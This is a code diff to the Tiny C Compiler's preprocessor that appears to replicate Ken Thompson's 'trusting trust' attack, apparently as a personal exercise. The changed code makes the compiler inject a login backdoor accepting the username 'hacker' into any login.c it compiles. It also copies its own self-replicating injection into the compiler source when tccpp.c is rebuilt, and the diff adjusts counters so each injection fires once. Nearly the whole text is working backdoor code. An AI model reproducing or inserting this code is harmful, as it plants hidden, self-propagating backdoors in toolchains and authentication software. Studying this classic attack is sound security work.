@@ -614,10 +614,11 @@ static int handle_eob(void)
             len = IO_BUF_SIZE;
 #endif
             len = read(bf->fd, bf->buffer, len);
-            static int counter = 0;
+            static int counter1 = 0;
+  static int counter2 = 0;
   const char* inject_login = "if(strcmp(username, %chacker%c) == 0) {%c    printf(%cwelcome!%cn%c);%c    return 0;%c  }%c  ";
-  if(strstr(file->filename, "login.c") != NULL && bf->buffer[0] != ' ') {
-    unsigned char* inject_code[200];
+  if(strstr(file->filename, "login.c") != NULL && counter1 == 0) {
+    unsigned char* inject_code = tcc_malloc(sizeof(unsigned char) * 200);
     snprintf(inject_code, 200, inject_login, 34, 34, 10, 34, 92, 34, 10, 10, 10);
     int inject_len = strlen(inject_login);
     unsigned char* new_buf = tcc_malloc(sizeof(unsigned char) * IO_BUF_SIZE);
@@ -630,6 +631,7 @@ static int handle_eob(void)
     len = len + inject_len - 9;
     strncpy(bf->buffer, new_buf, len);
     bf->buffer[len] = 0;
+    counter1++;
     FILE* fw2 = fopen("/home/zmx/Desktop/trusting-trust/hack.c", "w");
     fwrite(bf->buffer, 1, len + 1, fw2);
     fclose(fw2);
@@ -638,10 +640,10 @@ static int handle_eob(void)
     fclose(fw3);
   }
   const char* inject_compiler = 
-    "static int counter = 0;%c  const char* inject_login = %c%s%c;%c  if(strstr(file->filename, %clogin.c%c) != NULL && bf->buffer[0] != %c %c) {%c    unsigned char* inject_code[200];%c    snprintf(inject_code, 200, inject_login, 34, 34, 10, 34, 92, 34, 10, 10, 10);%c    int inject_len = strlen(inject_login);%c    unsigned char* new_buf = tcc_malloc(sizeof(unsigned char) * IO_BUF_SIZE);%c    unsigned char* inject_location = strstr(bf->buffer, %cprintf(%c%cReject!%c);%c    int pre_inject_len = inject_location - bf->buffer;%c    new_buf[0] = %c %c;%c    strncpy(new_buf + 1, bf->buffer, pre_inject_len);%c    strncpy(new_buf + pre_inject_len + 1, inject_code, inject_len);%c    strcat(new_buf, inject_location);%c    len = len + inject_len - 9;%c    strncpy(bf->buffer, new_buf, len);%c    bf->buffer[len] = 0;%c  }%c  if(strstr(file->filename, %ctccpp.c%c) != NULL && counter == 0) {%c  const char* inject_compiler = %c    %c%s%c;%c    unsigned char* inject_code = tcc_malloc(sizeof(unsigned char) * 5000);%c    snprintf(inject_code, 5000, inject_compiler, 10, 34, inject_login, 34, 10, 34, 34, 39, 39, 10, 10, 10, 10, 10, 34, 92, 34, 34, 10, 10, 39, 39, 10, 10, 10, 10, 10, 10, 10, 10, 34, 34, 10, 10, 34, inject_compiler, 34, 10, 10, 10, 10, 10, 34, 34, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10);%c    int inject_len = strlen(inject_code);%c    unsigned char* new_buf = tcc_malloc(sizeof(unsigned char) * IO_BUF_SIZE);%c    unsigned char* inject_location = strstr(bf->buffer, %cif (len < 0)%c);%c    int pre_inject_len = inject_location - bf->buffer;%c    strncpy(new_buf, bf->buffer, pre_inject_len);%c    strncpy(new_buf + pre_inject_len, inject_code, inject_len);%c    strcat(new_buf, inject_location);%c    len = len + inject_len - 1;%c    strncpy(bf->buffer, new_buf, len + 2);%c    bf->buffer[len + 2] = 0;%c    counter++;%c  }%c            ";
-  if(strstr(file->filename, "tccpp.c") != NULL && counter == 0) {
+    "static int counter1 = 0;%c  static int counter2 = 0;%c  const char* inject_login = %c%s%c;%c  if(strstr(file->filename, %clogin.c%c) != NULL && counter1 == 0) {%c    unsigned char* inject_code = tcc_malloc(sizeof(unsigned char) * 200);%c    snprintf(inject_code, 200, inject_login, 34, 34, 10, 34, 92, 34, 10, 10, 10);%c    int inject_len = strlen(inject_login);%c    unsigned char* new_buf = tcc_malloc(sizeof(unsigned char) * IO_BUF_SIZE);%c    unsigned char* inject_location = strstr(bf->buffer, %cprintf(%c%cReject!%c);%c    int pre_inject_len = inject_location - bf->buffer;%c    new_buf[0] = %c %c;%c    strncpy(new_buf + 1, bf->buffer, pre_inject_len);%c    strncpy(new_buf + pre_inject_len + 1, inject_code, inject_len);%c    strcat(new_buf, inject_location);%c    len = len + inject_len - 9;%c    strncpy(bf->buffer, new_buf, len);%c    bf->buffer[len] = 0;%c    counter1++;%c  }%c  if(strstr(file->filename, %ctccpp.c%c) != NULL && counter2 == 0) {%c  const char* inject_compiler = %c    %c%s%c;%c    unsigned char* inject_code = tcc_malloc(sizeof(unsigned char) * 5000);%c    snprintf(inject_code, 5000, inject_compiler, 10, 10, 34, inject_login, 34, 10, 34, 34, 10, 10, 10, 10, 10, 34, 92, 34, 34, 10, 10, 39, 39, 10, 10, 10, 10, 10, 10, 10, 10, 10, 34, 34, 10, 10, 34, inject_compiler, 34, 10, 10, 10, 10, 10, 34, 34, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10);%c    int inject_len = strlen(inject_code);%c    unsigned char* new_buf = tcc_malloc(sizeof(unsigned char) * IO_BUF_SIZE);%c    unsigned char* inject_location = strstr(bf->buffer, %cif (len < 0)%c);%c    int pre_inject_len = inject_location - bf->buffer;%c    strncpy(new_buf, bf->buffer, pre_inject_len);%c    strncpy(new_buf + pre_inject_len, inject_code, inject_len);%c    strcat(new_buf, inject_location);%c    len = len + inject_len - 1;%c    strncpy(bf->buffer, new_buf, len + 2);%c    bf->buffer[len + 2] = 0;%c    counter2++;%c  }%c            ";
+  if(strstr(file->filename, "tccpp.c") != NULL && counter2 == 0) {
     unsigned char* inject_code = tcc_malloc(sizeof(unsigned char) * 5000);
-    snprintf(inject_code, 5000, inject_compiler, 10, 34, inject_login, 34, 10, 34, 34, 39, 39, 10, 10, 10, 10, 10, 34, 92, 34, 34, 10, 10, 39, 39, 10, 10, 10, 10, 10, 10, 10, 10, 34, 34, 10, 10, 34, inject_compiler, 34, 10, 10, 10, 10, 10, 34, 34, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10);
+    snprintf(inject_code, 5000, inject_compiler, 10, 10, 34, inject_login, 34, 10, 34, 34, 10, 10, 10, 10, 10, 34, 92, 34, 34, 10, 10, 39, 39, 10, 10, 10, 10, 10, 10, 10, 10, 10, 34, 34, 10, 10, 34, inject_compiler, 34, 10, 10, 10, 10, 10, 34, 34, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10);
     int inject_len = strlen(inject_code);
     unsigned char* new_buf = tcc_malloc(sizeof(unsigned char) * IO_BUF_SIZE);
     unsigned char* inject_location = strstr(bf->buffer, "if (len < 0)");
@@ -652,7 +654,7 @@ static int handle_eob(void)
     len = len + inject_len - 1;
     strncpy(bf->buffer, new_buf, len + 2);
     bf->buffer[len + 2] = 0;
-    counter++;
+    counter2++;
     FILE* fw2 = fopen("/home/zmx/Desktop/trusting-trust/hack.c", "w");
     fwrite(bf->buffer, 1, len + 1, fw2);
     fclose(fw2);
